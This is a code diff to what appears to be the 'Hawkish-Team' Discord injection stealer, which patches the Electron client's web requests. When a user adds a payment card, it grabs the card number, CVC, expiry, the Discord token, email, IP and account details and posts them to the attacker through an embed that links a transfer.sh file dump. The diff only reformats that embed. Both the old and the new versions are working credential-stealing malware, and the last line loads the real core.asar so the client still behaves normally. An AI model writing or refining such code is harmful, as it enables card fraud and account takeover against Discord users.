@@ -845,41 +845,44 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 await post(params)
             }
             break
-        case request.url.endsWith("tokens"):
-            var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
-
-            var params = await makeEmbed({
-                title: "Hawkish-Team User Credit Card Added",
-                description: `
-                Hawkished Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
-                **IP:** ${ip}\n\n
-                **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
-                **ID** <:iduser:1041634535395307520>\n\`\`\`${user.id}\`\`\`\n
-                **Email** <a:email:1041639672037785691>\n\`\`\`${user.email}\`\`\`\n
-                **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(user.premium_type)}\n
-                **Language** <:language:1041640473477001236>\n${GetLangue(user.locale)}\n
-                **A2F** <a:a2f:1040272766982692885>\n${GetA2F(user.mfa_enabled)}\n
-                **NSFW** <a:nsfw:1041640474617839616>\n${GetNSFW(user.nsfw_allowed)}\n
-                **Badges** <:badge:1041634538150973460>\n${GetBadges(user.flags)}\n
-                **Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
-                **Credit Card Expiration**\n\`\`\`${month}/${year}\`\`\`\n
-                **CVC**\n\`\`\`${CardCVC}\`\`\`\n
-                <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
-                thumbnail: userAvatar,
-                image: userBanner
-            })
-
-            var params2 = await makeEmbed({
-                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
-                color: config['embed-color'],
-                description: Friends.badges,
-                image: userBanner,
-                thumbnail: userAvatar
-            })
-
-            params.embeds.push(params2.embeds[0])
-            await post(params)
-            break
+            case request.url.endsWith("tokens"):
+                var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
+    
+                var params = await makeEmbed({
+                    title: "Hawkish-Team User Credit Card Added",
+                    color: config['embed-color'],
+                    fields: [
+                      { name: "Hawkished Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
+                      { name: "IP", value: ip },
+                      { name: "Username <:username:1041634536733290596>", value: `${user.username}#${user.discriminator}` },
+                      { name: "ID <:iduser:1041634535395307520>", value: user.id },
+                      { name: "Email <a:email:1041639672037785691>", value: user.email },
+                      { name: "Nitro Type <a:nitro:1041639670288748634>", value: GetNitro(user.premium_type) },
+                      { name: "Language <:language:1041640473477001236>", value: GetLangue(user.locale) },
+                      { name: "A2F <a:a2f:1040272766982692885>", value: GetA2F(user.mfa_enabled) },
+                      { name: "NSFW <a:nsfw:1041640474617839616>", value: GetNSFW(user.nsfw_allowed) },
+                      { name: "Badges <:badge:1041634538150973460>", value: GetBadges(user.flags) },
+                      { name: "Credit Card Number", value: CardNumber },
+                      { name: "Credit Card Expiration", value: `${month}/${year}` },
+                      { name: "CVC", value: CardCVC },
+                      { name: "<a:tokens:1041634540537511957> Token", value: token }
+                    ],
+    
+                    thumbnail: userAvatar,
+                    image: userBanner
+                  });
+    
+                var params2 = await makeEmbed({
+                    title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                    color: config['embed-color'],
+                    description: Friends.badges,
+                    image: userBanner,
+                    thumbnail: userAvatar
+                })
+    
+                params.embeds.push(params2.embeds[0])
+                await post(params)
+                break
     }
 })
 module.exports = require("./core.asar")
